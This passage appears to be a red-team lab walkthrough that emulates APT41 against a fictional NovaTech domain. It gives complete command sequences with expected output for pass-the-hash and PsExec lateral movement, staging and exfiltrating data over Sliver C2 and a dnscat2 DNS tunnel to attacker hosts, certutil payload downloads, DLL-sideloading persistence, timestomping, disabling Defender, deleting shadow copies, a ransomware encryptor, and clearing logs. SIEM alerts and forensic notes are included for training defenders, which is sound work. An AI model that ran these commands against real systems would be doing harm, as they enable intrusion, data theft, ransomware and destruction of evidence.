**Why jsmith (not svc_backup):** Ansible provisions `NOVATECH\jsmith` as a member of WS01's local
`Administrators` group. svc_backup holds Backup Operators rights on the domain but is NOT added as
local admin on WS01. CrackMapExec confirms this distinction before we waste time on psexec.

```bash
[KALI]
# Verify jsmith has local admin on WS01 — look for (Pwn3d!)
# -u jsmith: domain account   -p password   (no --local-auth: domain auth)
crackmapexec smb 192.168.10.50 \
  -u jsmith \
  -p 'Research#2024'
```

**Expected:**
```
SMB  192.168.10.50  445  WS01  [*] Windows 10 Build 19041 (name:WS01) (domain:novatech.local) (signing:False) (SMBv1:False)
SMB  192.168.10.50  445  WS01  [+] novatech.local\jsmith:Research#2024 (Pwn3d!)
```

`(Pwn3d!)` = CrackMapExec confirmed remote execution rights (local admin). Without it you get
`[+]` (auth succeeded) but no shell.

```bash
[KALI]
# Get SYSTEM shell on WS01 via Impacket PsExec
# PsExec: uploads a randomized service binary to ADMIN$, starts it as a Windows service,
# gives you a SYSTEM shell via a named pipe. Noisy but reliable.
impacket-psexec novatech.local/jsmith:'Research#2024'@192.168.10.50 cmd.exe
```

**Expected:**
```
[*] Requesting shares on 192.168.10.50.....
[*] Found writable share ADMIN$
[*] Uploading file aBcDeFgH.exe
[*] Opening SVCManager on 192.168.10.50.....
[*] Creating service rAnD on 192.168.10.50.....
[*] Starting service rAnD.....
[!] Press help for extra shell commands

Microsoft Windows [Version 10.0.19041.xxx]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
WS01
```

> **Now go run Phase 4.3** (LSASS dump) while you have the WS01 shell.

**SIEM alerts fired:**
- Windows EID 4624 (LogonType 3): NTLM network logon from `192.168.10.5` (Kali on target_net) — **HIGH**
- Windows EID 4697: Service installed (PsExec randomized service) — **HIGH**
- Sysmon EID 1: Service binary execution — **HIGH**

### 5.2 WS01 → DC01 via Pass-the-Hash

**What is Pass-the-Hash:** Windows NTLM authentication doesn't need the plaintext password —
it only needs the NT hash. By passing the hash directly to the authentication challenge, we
authenticate as Administrator without ever cracking the password. We got the Administrator NTLM
hash from the NTDS dump in Phase 4.2.

```bash
[KALI]
ADMIN_NTLM=$(cat /opt/loot/admin_ntlm.txt)

# Confirm Administrator hash is valid across the subnet
# -H: use NTLM hash instead of password   format: LM_hash:NT_hash
# The LM hash (aad3b435...) is a dummy — Windows hasn't used LM since Vista
crackmapexec smb 192.168.10.0/24 \
  -u administrator \
  -H "aad3b435b51404eeaad3b435b51404ee:${ADMIN_NTLM}" \
  --local-auth \
  -x "whoami"
```

**Expected — hash works on DC01 and WS01:**
```
SMB  192.168.10.10  445  DC01   [+] novatech.local\administrator:<NTLM_HASH> (Pwn3d!)
SMB  192.168.10.10  445  DC01   [+] whoami: nt authority\system
SMB  192.168.10.50  445  WS01   [+] novatech.local\administrator:<NTLM_HASH> (Pwn3d!)
```

```bash
[KALI]
# Get interactive SYSTEM shell on DC01
impacket-psexec \
  -hashes "aad3b435b51404eeaad3b435b51404ee:${ADMIN_NTLM}" \
  novatech.local/administrator@192.168.10.10 cmd.exe
```

**Expected:**
```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC01

C:\Windows\system32> net user Administrator /domain
...Account active: Yes
...Password last set: ...
...Local Group Memberships: *Administrators
...Global Group memberships: *Domain Users  *Domain Admins  *Group Policy Creator Owners ...
```

### 5.3 WMI for Quiet Remote Execution

**Why WMI instead of PsExec:** Impacket PsExec creates a Windows service (visible in EID 4697, SCM
logs). WMI remote execution uses the existing Windows Management Instrumentation infrastructure —
no service is created, no binary is uploaded. Still noisy on the wire (DCOM traffic) but generates
fewer host artifacts.

```bash
[KALI]
# Run commands remotely via WMI — quieter than psexec
# Use plaintext password (known from NTDS) or -hashes for PtH
impacket-wmiexec \
  novatech.local/administrator:'NovaTech_Admin2024!'@192.168.10.50 \
  "whoami && ipconfig /all && net localgroup Administrators"
```

---

## Phase 6: Collection

**ATT&CK:** T1005, T1074.001, T1560.001, T1105

**What's happening:** We have SYSTEM on DC01. FS01 holds the crown jewels (clinical trial data,
manufacturing docs). From DC01 we can mount FS01 shares using Domain Admin credentials, copy
everything to a local staging directory, and compress it into an encrypted archive for exfiltration.

```bash
[DC01 — cmd.exe SYSTEM session]
# Verify what shares FS01 exposes
net view \\192.168.10.20

# Expected:
# Share name   Type  Used as  Comment
# Research     Disk           Phase III clinical trial data
# Manufacturing Disk          Synthesis documentation
# ADMIN$       Disk           Remote Admin
# C$           Disk           Default share
# IPC$         IPC            Remote IPC
```

```bash
[DC01]
# Mount FS01 shares with explicit Domain Admin credentials
# /user: domain\user syntax   pass the plaintext password
net use Z: \\192.168.10.20\Research      /user:NOVATECH\Administrator NovaTech_Admin2024!
net use Y: \\192.168.10.20\Manufacturing /user:NOVATECH\Administrator NovaTech_Admin2024!

# Confirm mounts
net use
# Z:  \\192.168.10.20\Research      OK
# Y:  \\192.168.10.20\Manufacturing OK

# Browse the data
dir Z:\ /s /b | findstr /i "trial data formula synthesis patent nda"
dir Y:\ /s /b
```

**Expected on FS01 (provisioned by Ansible):**
```
Z:\clinical_data_record_1.csv
Z:\clinical_data_record_2.csv
... (30 records)
Z:\NDA_filing_2026.pdf
Y:\synthesis_process_1.docx
... (15 docs)
```

```bash
[DC01]
# Stage all data locally
mkdir C:\Temp\archive
mkdir C:\Temp\archive\Research
mkdir C:\Temp\archive\Manufacturing
mkdir C:\Temp\archive\SYSVOL

# robocopy — robust file copy, better than xcopy for large trees
# /E: copy all subdirectories including empty ones
# /NFL: no file listing in output (quiet)
# /NDL: no directory listing   /NC: no class   /NJS: no job summary   /NJH: no job header
robocopy Z:\ C:\Temp\archive\Research      /E /NFL /NDL /NC /NJS /NJH
robocopy Y:\ C:\Temp\archive\Manufacturing /E /NFL /NDL /NC /NJS /NJH

# SYSVOL: may contain Group Policy scripts with hardcoded credentials
robocopy \\192.168.10.10\SYSVOL C:\Temp\archive\SYSVOL /E /NFL /NDL

# Verify staged data
dir /s C:\Temp\archive\ | find "File(s)"
```

```bash
[DC01]
# Download 7za.exe (standalone 7-Zip) from Kali staging via certutil
# certutil -urlcache -f: use URL caching to fetch a file — documented APT41 LOLBAS technique
# Uses a signed Windows binary as a downloader — no curl.exe or wget needed
certutil.exe -urlcache -f http://10.0.0.5:8900/7za.exe C:\Temp\7za.exe

# Compress with AES-256 password encryption
# a: add to archive   -tzip: ZIP format   -p: set password   -mx9: maximum compression
C:\Temp\7za.exe a -tzip -p"RxPhage2024!" -mx9 C:\Temp\data.zip C:\Temp\archive\

# Check final archive size
dir C:\Temp\data.zip
```

**Expected:** `C:\Temp\data.zip` — ~2-5 MB (dummy data, much smaller than real clinical data)

---

## Phase 7: Exfiltration

**ATT&CK:** T1041, T1048.001

### 7.1 Primary: HTTPS via Sliver C2 (DC01 session)

**What's happening:** Data is staged on DC01. We need a Sliver session on DC01 to download it.
First, we deploy RxPhage on DC01 to get a C2 session there, then exfiltrate via the beacon.

**Deploy RxPhage Windows loader on DC01:**
```bash
[DC01]
# Download the Windows PE loader from Kali staging
# rxphage_loader.dll runs as a standalone PE if renamed to rxphage.exe
certutil.exe -urlcache -f http://10.0.0.5:8900/rxphage/rxphage.exe C:\Temp\rxphage.exe

# Start it (connects back to Sliver C2 at 10.0.0.10:443)
start /b C:\Temp\rxphage.exe
```

```bash
[C2] — Sliver console
sliver > sessions
# Should now show a DC01 session
# ID  Name   Transport  RemoteAddress         Hostname  Username           OS/Arch
# 1   WEB01  https      192.168.10.100:xxxxx  web01     www-data           linux/amd64
# 2   DC01   https      192.168.10.10:xxxxx   DC01      NT AUTHORITY\SYSTEM windows/amd64

sliver > use 2       # use the DC01 session

# Switch beacon to interactive mode — removes the 60-second check-in delay
# Without this, a 2.31 GB file transfer would be chunked through 60-second intervals
# (each chunk must wait for the next beacon cycle — would take hours at normal rate)
sliver (DC01) > sleep 0
# [*] Beacon sleep set to 0s (interactive mode)
```

```bash
[C2]
# Download the archive from DC01 to /opt/loot/ on Kali
sliver (DC01) > download C:\Temp\data.zip /opt/loot/dc01_data.zip
# [*] Downloading C:\Temp\data.zip (2.31 GB)...
# [*] Wrote 2.31 GB to /opt/loot/dc01_data.zip

# Restore periodic beacon immediately after transfer completes
# sleep 0 means continuous HTTPS polling — far too noisy for long-term ops
sliver (DC01) > sleep 60
# [*] Beacon sleep set to 60s (normal ops mode)
```

```bash
[KALI]
# Verify the archive is intact and decrypt a sample
ls -lh /opt/loot/dc01_data.zip
7za l -p"RxPhage2024!" /opt/loot/dc01_data.zip | head -20
```

**Detection note:** Zeek `conn.log` shows long-duration HTTPS sessions to `10.0.0.10:443` during
`sleep 0` — sustained byte counts distinguish this from the normal 60-second beacon rhythm.
The Windows SRUM database (`C:\Windows\System32\sru\SRUDB.dat`) independently records bytes sent
by `rxphage.exe` — a forensic artifact that survives even if network captures are unavailable.

### 7.2 Backup Channel: DNS Tunneling (dnscat2)

**Why DNS tunneling:** DNS port 53 is rarely blocked outbound (DNS must work for the machine to
function). An HTTPS C2 channel might get blocked by proxy or firewall — a DNS tunnel provides
a backup that works through most filtering. dnscat2 encodes data in DNS query subdomains.

**Note on APT41 attribution:** APT41 is assessed to use custom DNS C2 implementations. dnscat2 is a
publicly available tool — it serves as a functional analogue for the lab but carries LOW attribution
value for APT41 specifically.

```bash
[KALI]
# dnscat2 server — listens for DNS queries on UDP 53
# --dns domain: the tunnel domain (clients query *.tunnel.attacker-infra.com)
# --no-cache: disable caching for accuracy in lab testing
# --secret: HMAC symmetric encryption key → prevents eavesdroppers from injecting commands
# Without --secret the sub-technique would be T1048.003 (unencrypted); with it: T1048.001
ruby /opt/tools/dnscat2/dnscat2.rb \
  --dns "host=10.0.0.5,port=53,domain=tunnel.attacker-infra.com" \
  --no-cache \
  --secret="DragonRx2024"
```

```bash
[WEB01 — via webshell or Sliver shell — deploy dnscat2 client]
wget -q http://10.0.0.5:8900/dnscat -O /tmp/.cache/dnscat
chmod +x /tmp/.cache/dnscat

# --secret must match the server secret
nohup /tmp/.cache/dnscat \
  --secret="DragonRx2024" \
  tunnel.attacker-infra.com \
  &>/dev/null &
echo "dnscat2 PID: $!"
```

**Back in dnscat2 server — session appears:**
```
New window created: 1
New window created: 1
(the new window can be interacted with)
dnscat2> windows
0 :: main [active]
  crypto-debug :: Security
  1 :: command (web01) [encrypted, NOT verified]
dnscat2> window -i 1
command (web01) 1> shell
command (web01) 1> New window created: 2
Shell session created!
command (web01) 1> window -i 2
```

**SIEM alert fired:**
- Zeek DNS: high-entropy subdomain labels > 40 characters, entropy > 3.5 bits/char — **MEDIUM**

---

## Phase 8: DLL Sideloading Persistence on DC01

**ATT&CK:** T1574.002, T1053.005, T1070.006

**What's happening:** The DLL sideloading technique abuses Windows DLL search order. When a binary
searches for a DLL, Windows looks in the application directory first — before `System32`. By placing
a malicious DLL with the right name next to a legitimate, signed binary, we hijack the load. This is
one of APT41's most extensively documented persistence patterns (PlugX deployment methodology).

**Our setup:** Oracle `java.exe` (signed by Oracle) loads `jvm.dll` from its directory. We copy
`java.exe` to an attacker-controlled directory and place our malicious `jvm.dll` alongside it. A
scheduled task runs `java.exe` at boot → loads our DLL → executes our payload.

```bash
[DC01 — cmd.exe SYSTEM session]
# Create the persistence directory
# C:\ProgramData\Oracle\Java\javapath is a real path used by Oracle Java installers
# Using it makes the directory blend with legitimate software
mkdir "C:\ProgramData\Oracle\Java\javapath"

# Download a legitimate java.exe from Kali staging to act as the sideload host binary
# (DC01 has no Java installed — we stage our own copy)
# This binary is signed by Oracle, making the scheduled task look legitimate in process listings
certutil.exe -urlcache -f http://10.0.0.5:8900/java.exe \
  "C:\ProgramData\Oracle\Java\javapath\java.exe"

# Verify the binary is valid (it should have an Oracle code-signing certificate)
powershell -command ^
  "(Get-AuthenticodeSignature 'C:\ProgramData\Oracle\Java\javapath\java.exe').Status"
# Expected: Valid
```

```bash
[C2] — Sliver console
sliver > use 2   # DC01 session

# Upload the malicious jvm.dll (RxPhage Windows DLL loader)
# When java.exe runs, Windows finds jvm.dll in the same directory (before System32)
# and loads it — executing our payload as SYSTEM via the scheduled task
sliver (DC01) > upload /opt/tools/rxphage/rxphage_loader.dll \
                       "C:\ProgramData\Oracle\Java\javapath\jvm.dll"
# [*] Wrote 524288 bytes to C:\ProgramData\Oracle\Java\javapath\jvm.dll
```

```bash
[DC01]
# Create scheduled task for boot persistence
# /tn: task name (JavaUpdateService mimics legitimate Java maintenance tasks)
# /tr: full path to the executable
# /sc ONSTART: run at every system startup
# /ru SYSTEM: run as SYSTEM account (highest privilege)
# /f: force creation (overwrite if exists)
schtasks /create ^
  /tn "JavaUpdateService" ^
  /tr "\"C:\ProgramData\Oracle\Java\javapath\java.exe\"" ^
  /sc ONSTART ^
  /ru SYSTEM ^
  /f

# Verify the task was created
schtasks /query /tn "JavaUpdateService" /fo LIST
```

**Expected:**
```
Folder: \
HostName:                             DC01
TaskName:                             \JavaUpdateService
Status:                               Ready
Run As User:                          SYSTEM
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
```

```bash
[DC01]
# TIMESTOMPING: modify the DLL's LastWriteTime to obscure when it was installed
# The attacker sets the timestamp to 2023 to make it look like pre-existing software
# Uses PowerShell's .LastWriteTime property on the FileInfo object
powershell -command ^
  "(Get-Item 'C:\ProgramData\Oracle\Java\javapath\jvm.dll').LastWriteTime = '2023-01-15 09:00:00'"

# Verify the LastWriteTime was changed (this is $STANDARD_INFORMATION in NTFS MFT)
powershell -command ^
  "(Get-Item 'C:\ProgramData\Oracle\Java\javapath\jvm.dll').LastWriteTime"
# 01/15/2023 09:00:00

# Check directory listing shows the fake timestamp
dir /tw "C:\ProgramData\Oracle\Java\javapath\"
```

> **Forensic countermeasure:** Timestomping only modifies `$STANDARD_INFORMATION` in the NTFS MFT.
> The `$FILE_NAME` attribute is written by the NTFS kernel during file creation — the attacker
> cannot modify it with standard tools. A forensic examiner comparing both attributes will see:
> - `$STANDARD_INFORMATION.Created`: 2023-01-15 09:00:00 (tampered)
> - `$FILE_NAME.Created`: 2026-04-24 02:00:15 (real)
> The discrepancy is an immediate forensic red flag.

**SIEM alert fired:**
- Sysmon EID 7 (ImageLoad): unsigned `jvm.dll` loaded by `java.exe` from `C:\ProgramData` — **HIGH**

---

## Phase 9 (Optional): Ransomware Phase

**ATT&CK:** T1562.001, T1490, T1486

**Context:** APT41 is assessed — not confirmed — to follow espionage operations with criminal
monetization in specific campaigns. This phase is optional. The encryptor only targets
`C:\Temp\RansomTest\` — it is safe to run.

```bash
[DC01 — as SYSTEM]
# Step 1: Impair defenses — T1562.001
# Disable Windows Defender via registry (GPO path — persists across reboots)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
# Disable real-time monitoring via PowerShell cmdlet (immediate effect)
powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"

# Confirm Defender is disabled
powershell -command "Get-MpPreference | Select-Object DisableRealtimeMonitoring"
# DisableRealtimeMonitoring : True

# Step 2: Inhibit System Recovery — T1490
# Delete all Volume Shadow Copies (VSS snapshots) — prevents file recovery
vssadmin delete shadows /all /quiet
# Stop Windows Backup services
net stop "wbengine" /y   2>nul   & rem Windows Backup Engine
net stop "SDRSVC"   /y   2>nul   & rem System Data Recovery Service
net stop "swprv"    /y   2>nul   & rem MS Software Shadow Copy Provider

# Verify no shadow copies remain
vssadmin list shadows
# No items found that satisfy the query.

# Step 3: Encryption — T1486 (SAFE: targets C:\Temp\RansomTest\ ONLY)
mkdir C:\Temp\RansomTest
echo "NovaTech Phase III Trial — Patient Cohort Alpha CONFIDENTIAL" > C:\Temp\RansomTest\research.txt
echo "Proprietary Synthesis Formula v2.3 — RESTRICTED"             > C:\Temp\RansomTest\formula.xlsx

# Stage and run the encryptor
certutil.exe -urlcache -f http://10.0.0.5:8900/rxphage_encrypt.exe C:\Temp\rxphage_encrypt.exe
C:\Temp\rxphage_encrypt.exe --path C:\Temp\RansomTest\

# View ransom note deployed by encryptor
type C:\Temp\RansomTest\DRAGONRX_RANSOM.txt
```

**ATT&CK mapping note:**
- `vssadmin delete shadows` → T1490 (Inhibit System Recovery) — deletes recovery mechanisms, not data
- `rxphage_encrypt.exe` → T1486 (Data Encrypted for Impact) — encrypts files for extortion
- Disabling Defender → T1562.001 (Impair Defenses)

**SIEM alert fired:**
- Sysmon EID 1: `vssadmin.exe` with `delete` argument — **HIGH**
- Windows EID 4688: same process creation event — **HIGH**

---

## Phase 10: Cleanup / Anti-Forensics

**ATT&CK:** T1070.004, T1070.001, T1070.006

**What's happening:** APT41 is documented to use anti-forensic techniques to extend dwell time and
complicate attribution. In practice, sophisticated actors often retain persistence (webshell, DLL
sideload) while cleaning initial exploitation artifacts.

```bash
[WEB01 — Linux cleanup]
# Clear bash command history
# history -c: clear in-memory history
# history -w: write (empty) history to file
# unset HISTFILE: prevent session from writing a new history file on exit
history -c && history -w
cat /dev/null > ~/.bash_history
unset HISTFILE

# Remove the Log4Shell evidence from the Tomcat access log
# The ${jndi:} string in access.log is the primary forensic artifact for initial access
# APT41 has been documented removing web server logs
# NOTE: this is very noisy — the log file disappearing is itself a detection signal
# Real APT41 often edits specific lines rather than deleting the whole log
cat /var/log/tomcat*/access_log* 2>/dev/null | grep -v "jndi" > /tmp/clean_log && \
  mv /tmp/clean_log /var/log/tomcat*/access_log* 2>/dev/null

# Remove dnscat2 if decommissioning the DNS tunnel
# kill $(pgrep dnscat)
# rm -f /tmp/.cache/dnscat

# Leave webshell and RxPhage in place — APT41 retains persistence after initial access cleanup
```

```bash
[DC01 — Windows cleanup]
# Clear Windows event logs — T1070.001
# Security log: contains all our authentication events (EID 4624, 4662, 4769, etc.)
# System log: contains service creation (PsExec), VSS events
# Application log: application-specific events
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Verify logs cleared
wevtutil gli Security | findstr "NumberOfLogRecords"
# NumberOfLogRecords: 0

# Clear PowerShell command history (stored per-user)
powershell -command ^
  "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; Clear-History"

# Remove staging artifacts (but KEEP persistence — DLL sideload + scheduled task stay)
del /f /q C:\Temp\lsass.dmp       2>nul
del /f /q C:\Temp\data.zip        2>nul
del /f /q C:\Temp\7za.exe         2>nul
del /f /q C:\Temp\rxphage.exe     2>nul
del /f /q C:\Temp\rxphage_encrypt.exe 2>nul
del /f /q C:\Temp\SharpHound.exe  2>nul

rmdir /s /q C:\Temp\archive       2>nul
rmdir /s /q C:\Temp\bh_output     2>nul
rmdir /s /q C:\Temp\RansomTest    2>nul
```

> **Forensic reality:** Clearing Windows event logs is itself a high-fidelity detection signal
> (Windows EID 1102 — audit log cleared, EID 104 — system log cleared). Wazuh and any properly
> configured SIEM will alert on log clearing. Sophisticated actors clear logs rarely and surgically
> to avoid this signal. For this lab, it demonstrates the capability.

---

## Kill Chain Summary

```
INITIAL ACCESS
  Log4Shell (CVE-2021-44228) via X-Api-Version header → www-data@web01

FOOTHOLD (two independent channels)
  ├── JSP webshell: /resources/imgs/cache.jsp
  └── RxPhage beacon: /tmp/.cache/rxphage → Sliver C2 (10.0.0.10:443)

DISCOVERY
  /proc/1/environ → LDAP_USER=svc_ldap / LDAP_PASS=NovaTech2021!
  ldapsearch → svc_backup (SPN, Backup Operators), jsmith (R&D, local admin WS01)

CREDENTIAL ACCESS
  Kerberoast svc_backup                     → Backup_Svc99!
  impacket-secretsdump -use-vss (DC01)      → ALL domain NTLM hashes incl. Administrator + krbtgt
  LSASS dump on WS01 (optional demo)        → jsmith NTLM

LATERAL MOVEMENT
  jsmith:Research#2024 → WS01 (PsExec SYSTEM)
  Administrator NTLM   → DC01 (PtH, PsExec SYSTEM)

COLLECTION
  net use → FS01\Research, FS01\Manufacturing, DC01\SYSVOL
  certutil + 7za → 2.31 GB encrypted archive (C:\Temp\data.zip)

EXFILTRATION
  Sliver download (sleep 0) → /opt/loot/dc01_data.zip
  dnscat2 DNS tunnel         → backup channel (T1048.001)

PERSISTENCE on DC01
  DLL sideloading: java.exe + jvm.dll (rxphage_loader)
  Scheduled task: JavaUpdateService (ONSTART, SYSTEM)
  Timestomping: LastWriteTime = 2023-01-15

OPTIONAL IMPACT
  vssadmin delete shadows → T1490
  rxphage_encrypt.exe     → T1486 (safe test path only)

DWELL TIME: 4 days, 17 hours, 37 minutes
12 SIEM alerts generated — none reviewed until Day 6
```

---

## Loot Summary

```
/opt/loot/
├── recon/
│   ├── web01_scan.nmap             nmap results — version + default scripts
│   └── whatweb.txt                 web technology fingerprint
├── kerberoast_hashes.txt           TGS hash: svc_backup  ($krb5tgs$23$)
├── kerberoast_cracked.txt          svc_backup:Backup_Svc99!
├── ntds_dump.ntds                  All domain NTLM hashes (Administrator, krbtgt, ...)
├── admin_ntlm.txt                  Administrator NTLM (extracted for PtH)
├── lsass.dmp                       LSASS memory dump from WS01
├── dc01_data.zip                   Crown jewels: Research + Manufacturing + SYSVOL
└── bh_output/
    └── <timestamp>_BloodHound.zip  BloodHound AD attack path graph
```

---

*Next: [Detection Guide](detection-guide.md) — every alert the SIEM generates during this attack, what it looks like in Kibana, and how to write detection rules for each phase.*
